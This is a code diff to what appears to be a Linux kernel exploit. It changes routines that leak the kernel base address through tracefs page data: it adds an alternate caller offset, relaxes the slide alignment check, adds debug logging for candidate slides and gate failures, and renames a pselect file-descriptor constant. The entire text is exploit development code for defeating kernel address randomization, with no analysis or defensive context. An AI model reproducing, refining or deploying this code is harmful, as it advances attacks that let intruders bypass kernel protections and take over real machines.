@@ -388,6 +388,9 @@ static int slide_tracefs_parse_page(const unsigned char *page,
       slide_tracefs_raw_callers++;
       static const uint64_t link_callers[] = {
         KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
+#ifdef SLIDE_TRACEFS_WORKER_CALLER_OFF_ALT
+        KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF_ALT,
+#endif
 #ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
         KIMAGE_TEXT_BASE + SLIDE_TRACEFS_VFORK_CALLER_OFF,
 #endif
@@ -396,10 +399,18 @@ static int slide_tracefs_parse_page(const unsigned char *page,
            index < sizeof(link_callers) / sizeof(link_callers[0]); index++) {
         if (caller >= link_callers[index]) {
           uint64_t candidate = caller - link_callers[index];
-          if ((candidate & 0x1fffffULL) == 0) {
-            size_t slot = (size_t)(candidate >> 21);
+          if (candidate <= 0x4000000000ULL &&
+                (candidate & 0xffffULL) == 0) {
+              size_t slot = (size_t)((candidate >> 16) &
+                                     (SLIDE_TRACEFS_CANDIDATES - 1));
+            pr_info("tracefs cand raw=%016llx call=%016llx slot=%zu\n",
+                    (unsigned long long)candidate,
+                    (unsigned long long)caller, slot);
             if (slot < SLIDE_TRACEFS_CANDIDATES) {
               slide_tracefs_candidate_hits[slot]++;
+            } else {
+              pr_warning("tracefs slot overflow slot=%zu max=%d\n",
+                         slot, SLIDE_TRACEFS_CANDIDATES);
             }
           }
         }
@@ -628,6 +639,8 @@ static int slide_tracefs_leak_kernel_base(void) {
           slide_tracefs_parse_failures, candidate_count, cpu_files);
   if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
       candidate_count != 1) {
+    pr_info("tracefs gate scan_ok=%d parse_fail=%u cpu_files=%u candidates=%d\n",
+            scan_ok, slide_tracefs_parse_failures, cpu_files, candidate_count);
     pr_warning("slide tracefs candidate gate failed\n");
     goto out;
   }
@@ -3028,8 +3041,8 @@ int slide_leak_kernel_base(void) {
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
     int fds[2];
-    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
-    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
+    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, PSELECT_ROUTE_NFDS + 128));
+    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, PSELECT_ROUTE_NFDS + 129));
     SYSCHK(close(raw_fds[0]));
     SYSCHK(close(raw_fds[1]));
 
